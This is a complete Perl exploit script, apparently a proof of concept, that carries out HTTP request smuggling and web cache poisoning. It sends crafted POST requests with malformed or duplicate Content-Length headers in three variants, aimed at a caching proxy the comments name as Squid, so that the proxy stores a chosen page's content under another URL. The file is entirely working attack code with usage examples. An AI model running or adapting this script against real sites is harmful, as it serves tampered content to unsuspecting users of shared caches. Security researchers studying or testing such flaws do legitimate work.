#!/usr/bin/perl
use strict;
use Socket;

if (scalar(@ARGV) eq 0)
{
	print "smuggle.pl host port variant(1/2/5) POST_path target_path poison_path\n";
	print "EXAMPLES:\n";
	print "Variant 1 (Header SP junk):\n";
	print "smuggle.pl www.example.com 80 1 /hello.php /welcome.html /poison.html\n";
	print "Variant 2 (Header SP junk + Wait):\n";
	print "smuggle.pl www.example.com 80 2 /hello.php /welcome.html /poison.html\n";
	print "Variant 5 (CR Header + Wait):\n";
	print "smuggle.pl www.example.com 80 5 /hello.php /welcome.html /poison.html\n";
	exit;
}

my $debug=1;

my $host = $ARGV[0]; 		# "foo.com";
my $port = $ARGV[1]; 		# 80;
my $variant=$ARGV[2];		# "3-cached";
my $post_path=$ARGV[3]; 	# "/hello.php";
my $target_path=$ARGV[4];	# "/b.php";
my $poison_path=$ARGV[5];	# "/a.php";

socket(SOCKET,PF_INET,SOCK_STREAM,(getprotobyname('tcp'))[2])
   or die "Can't create a socket $ ($!)\n";
connect( SOCKET, pack_sockaddr_in($port, inet_aton($host)))
   or die "Can't connect to port $port ($!)\n";
my $old_fh = select(SOCKET);
$| = 1;
select($old_fh);

sub dump_socket
{
	if ($debug)
	{
		my $data;
		#recv(SOCKET,$data,999999,MSG_DONTWAIT);
		recv(SOCKET,$data,999999,0);
		print $data;
	}
}

if ($variant eq "1")
{
	print SOCKET "POST $post_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Host: $host\r\n";
	#dump_socket();
	print SOCKET "Connection: Keep-Alive\r\n";
	#dump_socket();
	print SOCKET "Content-Length: ".(29+length($poison_path))."\r\n";
	#dump_socket();
	print SOCKET "Content-Length abcde: 3\r\n";
	#dump_socket();
	print SOCKET "\r\n";
	#dump_socket();
	print SOCKET "fooGET $poison_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Something: GET $target_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Cache-Control: no-cache\r\n";
	#dump_socket();
	print SOCKET "Host: $host\r\n";
	#dump_socket();
	print SOCKET "\r\n";
	#dump_socket();
	sleep(1);
	dump_socket();
}
elsif ($variant eq "2")
{
	print SOCKET "POST $post_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Host: $host\r\n";
	#dump_socket();
	print SOCKET "Connection: Keep-Alive\r\n";
	#dump_socket();
	print SOCKET "Content-Length abcde: ".(26+length($target_path))."\r\n";  # don't count the Cache-Control header, as Squid pushes it down anyway.
	#dump_socket();
	print SOCKET "\r\n";
	#dump_socket();
	print SOCKET "GET $target_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Cache-Control: no-cache\r\n"; # Don't worry... it's pushed down to the bottom of the request by Squid
	#dump_socket();
	print SOCKET "Something: GET $poison_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Host: $host\r\n";
	#dump_socket();
	print SOCKET "\r\n";
	dump_socket();
	sleep(31);
	dump_socket();
}
elsif ($variant eq "5")
{
	print SOCKET "POST $post_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Host: $host\r\n";
	#dump_socket();
	print SOCKET "Connection: Keep-Alive\r\n";
	#dump_socket();
	print SOCKET "\rContent-Length: ".(26+length($target_path))."\r\n";   # don't count the Cache-Control header, as Squid pushes it down anyway.
	#dump_socket();
	print SOCKET "\r\n";
	#dump_socket();
	print SOCKET "GET $target_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Cache-Control: no-cache\r\n"; # Don't worry... it's pushed down to the bottom of the request by Squid
	#dump_socket();
	print SOCKET "Something: GET $poison_path HTTP/1.1\r\n";
	#dump_socket();
	print SOCKET "Host: $host\r\n";
	#dump_socket();
	print SOCKET "\r\n";
	dump_socket();
	sleep(31);
	dump_socket();
}
else
{
	print "Unknown variant - $variant\n";
}
close(SOCKET);
